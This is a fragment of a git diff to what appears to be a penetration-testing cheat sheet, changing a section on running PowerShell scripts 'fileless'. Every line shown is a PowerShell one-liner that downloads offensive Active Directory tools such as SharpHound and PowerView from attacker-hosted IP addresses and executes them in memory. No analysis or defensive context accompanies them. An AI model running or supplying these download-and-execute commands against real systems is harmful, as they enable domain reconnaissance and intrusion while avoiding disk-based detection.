@@ -29,7 +29,7 @@ powershell iex (New-Object Net.WebClient).DownloadString('http://10.2.3.85/Invok
 
 ## Fileless (Running PS1 without saving to disk)
 ```
-IEX(New-Object Net.WebClient).downloadString('http://10.10.16.4/SharpHound.ps1')
+IEX(New-Object Net.WebClient).downloadString('http://10.10.16.6:8000/SharpHound.ps1')
 IEX(New-Object Net.WebClient).downloadString('http://192.168.10.1:8000/PowerView.ps1')
 ```
 
